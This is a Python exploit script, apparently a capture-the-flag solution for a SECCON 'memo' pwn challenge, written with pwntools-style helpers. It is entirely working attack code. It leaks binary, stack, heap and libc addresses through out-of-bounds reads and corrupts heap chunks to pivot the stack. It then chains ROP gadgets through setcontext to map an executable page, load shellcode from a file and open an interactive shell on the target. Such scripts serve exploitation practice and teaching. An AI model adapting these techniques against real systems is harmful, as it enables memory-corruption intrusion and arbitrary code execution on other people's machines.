#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './memo'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'smemo.pwn.seccon.jp', 'port':36384})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
offset_csu_init     = binf.sep_function['__libc_csu_init']
offset_got_main     = binf.got['__libc_start_main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

addr_shellcode      = 0x100000

#==========

def attack(conn):
    memo = Memo(conn)

    memo.add(p64(0)+p64(0x31))
    memo.add(p64(0)+p64(0x31))

    addr_csu_init = u(memo.show(-2))
    binf.address = addr_csu_init - offset_csu_init
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))
    addr_got_main   = binf.address + offset_got_main
    addr_bss        = binf.sep_section['.bss']
    addr_buf        = addr_bss + 0x30

    addr_stack = u(memo.show(-4)) - 0x90
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    addr_heap_base = u(memo.show(-5)) - 0x1020
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_main = u(memo.show(-21, p64(addr_got_main)))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_setcontext    = libc.sep_function['setcontext']

    rop = ROP(binf)
    exploit1  = p64(addr_heap_base+0x1078)
    exploit1 += p64(rop.leave.address)
    addr_r14_r15  = rop.r14_r15.address

    rop = ROP(libc)
    rop.read(constants.STDIN_FILENO, addr_heap_base + 0x10c8, 0x100)
    exploit2 = str(rop)
    memo.add(exploit2[:0x18]+p64(addr_r14_r15)+p64(0xdeadbeef)[:-1])
    memo.add(exploit2[0x18:])

    memo.delete(-21, p64(addr_heap_base + 0x1030))
    memo.delete(0)
    memo.add(p64(0)+p64(0x31)+p64(addr_stack - 0x78))

    memo.add('')
    memo.add(p64(addr_heap_base)+'a'*0x10 + exploit1, p64(0xdeadbeef)*7+p64(0x33))

    #==========

    shellcode = open('exploit.bin', 'rb').read()

    context  = p(-1)                                                                    # r8
    context += p64(0)                                                                   # r9
    context  = context.ljust(0x68-0x28)
    context += p64(addr_shellcode)                                                      # rdi
    context += p64((len(shellcode)+(0x1000-1)) & ~(0x1000-1))                           # rsi
    context  = context.ljust(0x88-0x28)
    context += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)    # rdx
    context += p64(0xdeadbeef)
    context += p64(constants.MAP_PRIVATE | constants.MAP_ANONYMOUS)                     # rcx

    rop = ROP(libc)
    rop.read(constants.STDIN_FILENO, addr_buf, len(context))
    rop.call(addr_libc_setcontext+0x5f, [addr_buf-0x28])
    rop.mmap()
    rop.read(constants.STDIN_FILENO, addr_shellcode, len(shellcode))
    rop.call(addr_shellcode)

    conn.send(str(rop))
    sleep(0.1)
    conn.send(context)
    sleep(0.1)
    conn.send(shellcode)

class Memo:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, data, append=''):
        self.sendlineafter('> ', '1'.ljust(8)+append)
        if len(data)>=0x27:
            self.sendafter('memo > ', data)
        else:
            self.sendlineafter('memo > ', data)

    def show(self, idx, append=''):
        self.sendlineafter('> ', '2'.ljust(8)+append)
        self.sendlineafter('id > ', str(idx))
        self.recvuntil('\n')
        return self.recvuntil('\n\n', drop=True)

    def delete(self, idx, append=''):
        self.sendlineafter('> ', '3'.ljust(8)+append)
        self.sendlineafter('id > ', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
